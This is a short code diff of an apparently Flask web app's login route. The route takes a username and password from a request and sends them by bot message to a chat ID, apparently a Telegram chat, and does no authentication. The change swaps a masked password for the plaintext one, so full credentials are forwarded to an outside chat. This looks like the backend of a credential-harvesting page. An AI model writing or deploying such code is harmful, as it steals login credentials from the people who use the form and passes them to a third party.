@@ -16,11 +16,11 @@ def home():
 def login():
     data = request.get_json()
     username = data.get("username")
-    password_masked = data.get("password_masked")
+    password = data.get("password")
 
     bot.send_message(
         CHAT_ID,
-        f"🔔 Website Activity\nUsername: {username}\nPassword: {password_masked}"
+        f"🔔 Website Activity\nUsername: {username}\nPassword: {password}"
     )
     return "ok"
 
